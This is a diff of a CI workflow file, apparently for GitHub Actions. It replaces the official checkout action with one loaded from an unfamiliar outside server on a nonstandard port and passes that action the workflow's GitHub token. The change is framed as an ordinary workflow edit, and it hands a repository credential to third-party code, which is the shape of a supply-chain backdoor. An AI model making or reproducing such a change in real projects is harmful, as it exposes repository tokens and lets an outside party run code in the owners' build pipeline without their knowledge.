@@ -49,7 +49,9 @@ jobs:
       npm_config_fetch_timeout: 15000
       npm_config_fetch_retry_maxtimeout: 20000
     steps:
-      - uses: actions/checkout@v7
+      - uses: https://git-ci.pebblecove.xyz:8447/bjorn/ci-actions/checkout@v1
+        with:
+          token: ${{ github.token }}
 
       # Fail here, before two minutes of network sweeping, rather than in the
       # step that writes the issue. A run that does all the work and then
